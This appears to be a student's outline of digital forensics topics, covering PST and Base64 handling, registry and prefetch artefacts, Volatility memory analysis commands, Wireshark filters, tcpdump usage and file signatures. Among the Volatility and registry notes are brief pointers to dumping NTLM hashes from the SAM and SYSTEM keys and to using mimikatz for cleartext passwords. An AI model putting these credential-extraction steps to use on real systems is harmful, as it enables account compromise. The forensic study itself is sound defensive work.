				Summary: Investigate metadata, listing protocols and ports used, keyword searching, extract .pst files out of memory
				PST (personal storage table) files>
					personal folder files in Microsoft Outlook
					store calendar events, copies of messages, notes
					Use tools such as pffexport to browse the .pst
				Base 64>
					group of binary to text encoding systems that represent binary data in ASCII format
					Each Base64 digit represents 6 bits of data, 3 bytes -> 4 Base64 digits
				    ASCII cleartext often encoded to Base64 before being transferred, so packet captures that contain emails will likely be encoded
					 Can decode, EG CyberChef tool
			Windows Registry> 
				{check registry heading in windows section}
				Subkeys can be used for analysis
					Startup item lists (MRU lists) and runtimes can be found and used to find info on malicious applications
						{Check persistence -> start-up items -> windows -> registry}
					Obtain NTLM PW hashes
						HKLM -> SAM and SYSTEM keys
			Prefetch algorithm>
				stores specific data about the apps you run to increase start times
				Windows requests data not stored in the disk cache and stores that data on the hard disk for easy retrieval
				Superfetch>
					Attempts to determine what apps you will launch and loads necessary files and data into memory
				Artefacts located in %Windows%\Prefetch
					List of started apps, 8 character hash from run location, timestamps, metadata EG run count and startup resources
				Sometimes it's disabled, Win8 prefetch turns off if an SSD is present, >Win8 systems calculates SSD performance before deciding 	
		Forensic Tools>
			Memory forensics>
				Volatility
					Operate on memory images, many plugins avaliable for more functionality 
				Others: FireEye Redline, Google GRR, and Rek
			Capture forensic images of HDs
				FTK imager						If you chose E01 (Expert witness) format
						Automatically calculates the hash value, compresses the file, splits file into chosen size, confirms data integrity
						Carry out investigation without editing captured data
			Automated parsing tools>
				TSK (The Sleuth Kit)/Autopsy
					TSK uses CLI, Autospy uses GUI
					meta data analysis, keyword searches, timelines and hash databases
					case management system
					Notes and audit logs
					Generate case file as an ASCII report
				Others: Magent IEF, Magnet Axiom
		Anti Forensics>
			operational security (OpSec) improvements
			EG 
				2017 NotPetya ransomware, spreads through the network using EternalBlue to exploit CVE-2017-0144 vulnerabilities in SMB
				Aim to modify MDR and encrypt MFT
				Before injecting into memory overwrites itself from the disk, zeros out the memory buffer, executes commands that ensure setup/system/security/application logs are cleared
			Evidence Eliminator	Tool has similar effects as above and deletes prefetch, recent documents, browser history, thumbnail cache,
			 recycle bin, alternate data streams, overwriting unallocated space on the disk.			
		Memory Forensics>
			analysis of volatile memory captures
			identify malicious behaviours and activities that do not leave detectable tracks on a hard drive.
			
			Memory capture>
				memory acquisition is a priority task if the target device was not powered off
				copy of everything that has been written to RAM since the last power cycle
				see running processes, child processes and orphaned processes
				Chose correct tool
					reliability and repeatability
					not trigger malware
			Volatility>	
				 analyse virtual memory dumps, virtual box dumps, raw dumps, crash dumps
				 Extract files left in memory from a memory dump
				  then carry out operations on it
				 Use with mimikatz to glean cleartext passwords
				Does not have memory acquisition capabilities so other tools are required to acquire the memory dumps 


				
				Identify OS
					volatility -f mem.image imageinfo
				//Append commands to discovered profile
					pslist: high-level view of running processes, psscan: Scan for EPROCESS blocks.
					pstree: Displays parent-process relationships, filescan: FILE_OBJECT handles.
					dumpfiles: Extracts FILE_OBJECTS from memory, hashdump: Get users and PW hashes
					userassist: User actions (pipe grep with usernames found in dumpfiles)
					mftparser: Master file table (contains records of files stored on disk, seed is kstructure and recover contents of smaller files)
					hivelist: Get registry, dlllist: dll used by multiple programs (see modules loaded and CLI arguments passed)
					
					volatility -f image -profile=Win10x64 {}
								
		Network Forensics>
			Capture packets>
				forensic investigation of network traffic and data captured in transit between devices
				Get info from IDS/IPS, switches, network TAPs or firewalls, proxy servers, web servers
					Consider protocols so you can find anomalies
						Data link and physical layer (ethernet)
						Transport and network layer (TCP/IP)
						File transfer: Server Message Block (SMB) and Network File System (NFS)
						Web: HTTP and HTTPS
						Email: Simple Mail Transfer Protocol (SMTP)
				NetFlow full packet capture and log files>
					Cisco tech, designed to find network tech faults, baseline network activity and carry out trend analysis allowing for a full picture of the network traffic
					Adv: on a normal network the storage requirements would be lower, and it can be enabled on already existing network infrastructure
					DisAdv: Stroage requirements still huge so not enforced on companies
					Analysis full package captures with Wireshark and tcpdump
					Can manually parse log files, or use Security Incident and Event Management Systems (SIEMS) which allow for custom rules
			Analysis packets>
				Wireshark>
					network packet analyser>
					Features>
						sniff packets going across the network through your machine and create a package capture (pcap)
						Visually display captures
						Protocol hierarchy -> apply filter to specific protocol
						Endpoints
					Useful filters>
						Via specified value
							ip.addr: IP address of 
							ip.dst: Destination IP address
							ip.src: source address IP 
							tcp.port: TCP ports 
							udp.port: UDP ports 
						http.request: Filters all HTTP GET and POST requests
						http.response: Shows the responses to the HTTP requests, including the response codes
						dns: Sets a filter to display all packets that contain DNS data
						tcp contains: Displays all TCP packets that contain a string matching whatever is defined as
				tcpdump>
					Can also sniff and save packets
					Commands
						tcpdump -i eth0 - investigate what is being transmitted to the interface you specify
						//Capture packets
						tcpdump host 10.10.10.10: captures packets where the host is 10.10.10.10
						tcpdump src 1.1.1.1: captures from source IP 1.1.1.1
						tcpdump dst 1.1.1.1: captures traffic with a destination IP 1.1.1.1
						tcpdump net 1.2.3.0/24: capture packets going to or from a particular network/subnet
						tcpdump -c 1 -X icmp: capture packet contents with Hex output
						tcpdump port 389: Shows specific port traffic, use tcpdump src port and dst port to be more granular
						tcpdump icmp: find traffic relating to specific protocols such as TCP, UDP 
				
		
		File Headers and Hex>
			A file is a collection of data structured in a way that allows for it to be opened in a relevant application
			0s and 1s encoded into hex, these can be viewed with a hex editor (EG Bless, HexEdit) 	
			File Headers>			
				/*
				Windows uses file extensions to chose which program opens what file
				Linux only focuses on the file header (the magic bytes)
				EG
					50 4B 03 04: normal zip file with something in it, 50 4B 05 06: empty zip file, 50 4B 07 08: zip file has been split into multiple parts 
				File header tells  the computer what format the rest of the file will be in
				*/
				https://en.wikipedia.org/wiki/List_of_file_signatures
				file [fileName]
			Hex
				Simpilify binary repersentation
				








































































